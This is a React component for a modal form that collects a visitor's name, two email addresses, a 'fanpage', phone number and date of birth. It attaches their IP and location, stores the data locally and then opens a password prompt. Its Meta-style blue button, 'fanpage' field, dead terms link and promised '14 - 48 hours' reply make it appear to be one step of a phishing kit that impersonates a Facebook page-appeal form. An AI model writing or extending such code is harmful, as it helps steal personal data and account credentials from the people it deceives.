import React from 'react';
import Modal from './Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '@/components/check-box/CustomCheckbox';
import { saveToLocalStorage } from '@/libs/storage';

interface ClientModalProps {
    isOpenAuth: boolean;
    userLocation: Record<string, any>;
    countryCode: string;
    onToggleAuth: (value: boolean) => void;
    onOpendPassword: (value: boolean) => void;
}

const ClientModal: React.FC<ClientModalProps> = ({ isOpenAuth, userLocation, countryCode, onToggleAuth, onOpendPassword }) => {

    const [isOpen, setIsOpen] = React.useState(isOpenAuth);
    const [errors, setErrors] = React.useState<Record<string, string>>({});

    React.useEffect(() => {
        setIsOpen(isOpenAuth);
    }, [isOpenAuth]);

    const [formData, setFormData] = React.useState({
        fullName: '',
        email: '',
        emailBusiness: '',
        fanpage: '',
        phone: '',
        day: '',
        month: '',
        year: ''
    });
    
    const handleClose = () => {
        setIsOpen(false);
        onToggleAuth(false);
        setFormData({
            fullName: '',
            email: '',
            emailBusiness: '',
            fanpage: '',
            phone: '',
            day: '',
            month: '',
            year: ''
        });
    };

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.fullName.trim()) newErrors.fullName = "Please enter enough full name.";
            if (!formData.email.trim()) newErrors.email = "Please enter enough email address.";
            if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Please enter enough email business address.";
            if (!formData.fanpage.trim()) newErrors.fanpage = "Please enter enough fanpage information.";
            if (!formData.phone.trim()) newErrors.phone = "Please enter enough phone number.";
            if (!formData.day.trim()) newErrors.day = "Please enter enough day.";
            if (!formData.month.trim()) newErrors.month = "Please enter enough month.";
            if (!formData.year.trim()) newErrors.year = "Please enter enough year.";

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }

            const clientData = {
                ...formData,
                ip: userLocation?.ip || "Unknown",
                location: userLocation?.location || "Unknown"
            };
            
            saveToLocalStorage("one_data", clientData);
            onOpendPassword(true);
            handleClose();

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title="Infomation"
            onClose={handleClose}
        >
            <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
                <form onSubmit={handSubmit}>
                    <div className='w-full'>
                        <div className={inputClass('fullName')}>
                            <input
                                type="text"
                                id='fullName'
                                autoComplete='new-name'
                                placeholder="Full Name"
                                className="w-full outline-[0] h-full"
                                value={formData.fullName}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('fullName')}

                        <div className={inputClass('email')}>
                            <input
                                type="text"
                                id='email'
                                autoComplete='new-email'
                                placeholder="Email"
                                className="w-full outline-[0] h-full"
                                value={formData.email}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('email')}

                        <div className={inputClass('emailBusiness')}>
                            <input
                                type="text"
                                id='emailBusiness'
                                placeholder="Email Business"
                                className="w-full outline-[0] h-full"
                                value={formData.emailBusiness}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('emailBusiness')}

                        <div className={inputClass('fanpage')}>
                            <input
                                type="text"
                                id='fanpage'
                                placeholder="Fanpage"
                                className="w-full outline-[0] h-full"
                                value={formData.fanpage}
                                onChange={handleChange}
                            />
                        </div>
                        {errorText('fanpage')}

                        <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
                            <PhoneInput
                                country={countryCode?.toLowerCase() || "us"}
                                value={formData.phone}
                                onChange={(phone) => setFormData(prev => ({ ...prev, phone }))}
                            />
                        </div>
                        {errorText('phone')}

                        <div>
                            <b className='text-[#9a979e] text-[14px] mb-[7px]'>Date of Birth</b>
                        </div>
                        <div className="grid grid-cols-3 gap-[10px]">
                            <div>
                                <div className={inputClass('day')}>
                                    <input
                                        type="number"
                                        placeholder="Day"
                                        id='day'
                                        className="w-full outline-0 h-full"
                                        value={formData.day}
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('day')}
                            </div>

                            <div>
                                <div className={inputClass('month')}>
                                    <input
                                        type="number"
                                        placeholder="Month"
                                        className="w-full outline-0 h-full"
                                        value={formData.month}
                                        id='month'
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('month')}
                            </div>

                            <div>
                                <div className={inputClass('year')}>
                                    <input
                                        type="number"
                                        inputMode="numeric"
                                        placeholder="Year"
                                        id='year'
                                        className="w-full outline-0 h-full"
                                        value={formData.year}
                                        onChange={handleChange}
                                    />
                                </div>
                                {errorText('year')}
                            </div>

                        </div>

                        <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
                            <textarea
                                id='message'
                                className="w-full outline-0 h-full resize-none"
                                placeholder="Message"
                            />
                        </div>

                        <div>
                            <p className='text-[#9a979e] text-[14px] mb-[7px]'>Our response will be sent to you within 14 - 48 hours.</p>
                        </div>
                        <div className='mt-[15px] mb-[20px]'>
                            <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                                <CustomCheckbox />
                                I agree with
                                <a className="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="/icons/ic_reject.svg" className="w-[10px] h-[10px] items-center inline" alt="reject" /></a>
                            </label>
                        </div>
                        <div className='w-full mt-[20px] '>
                            <button className='w-full h-[40px] min-h-[40px] bg-[#0064E0] text-[white] rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer'>Continue</button>
                        </div>
                    </div>

                </form>
            </div>
        </Modal>
    );
};

export default ClientModal;
